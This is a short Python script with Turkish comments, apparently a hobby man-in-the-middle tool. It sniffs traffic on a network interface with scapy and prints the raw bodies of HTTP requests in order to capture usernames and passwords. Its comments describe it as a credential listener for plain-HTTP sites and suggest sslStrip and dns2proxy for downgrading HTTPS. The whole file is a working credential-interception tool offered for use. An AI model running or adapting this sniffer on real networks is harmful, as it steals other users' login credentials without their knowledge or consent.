import scapy.all as scapy
# aglar icin ozellestirilmis paketler uretmemizi saglayan kutuphane
from scapy_http import http
# paket analizi fonksiyonunda kullanacagimiz komutlar icin kullanilan kutuphane
import optparse
# kullanicidan girdi almak icin kullanilan kutuphane

def kullanici_girdisi():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i","--interface",dest="interface",help="interface giriniz")
    girdi = parse_object.parse_args()[0]
    if not girdi.interface:
        print("interface giriniz!!!")
    return girdi

def paket_dinleyici(interface):
# scapy nin sniff ozelligiyle gelen paketleri sniff(koklama) islemini yapiyoruz.
    scapy.sniff(iface=interface, store=False, prn=paket_analiz)
# iface e kullanicinin kullandigi interface i atiyoruz.
# paketleri hafizaya kaydetmemek icin store u False atiyoruz
# prn callback fonksiyonunu belirtiyoruz.

def paket_analiz(packet):
# alinan paket icinde sadece username ve password un oldugu bolumu yazdir.
    if packet.haslayer(http.HTTPRequest):

        if packet.haslayer(scapy.Raw):

            print(packet[scapy.Raw].load)

kullanici = kullanici_girdisi()
kullanici_interface = kullanici.interface
paket_dinleyici(kullanici_interface)
# kullanim = python ortadaki-adam-dinleyici.py -i {interface}
# ornek = python ortadaki-adam-dinleyici.py -i wlan0
# sadece username ve passwordlari dinler.(sadece http sitelerde calisir)
# https'yi bypass etmek icin sslStrip ve dns2proxy kullanilabilir.(hsts sitelerde ise yaramaz)
# --------------------ahmetfurkansonmez12@gmail.com----------------------------
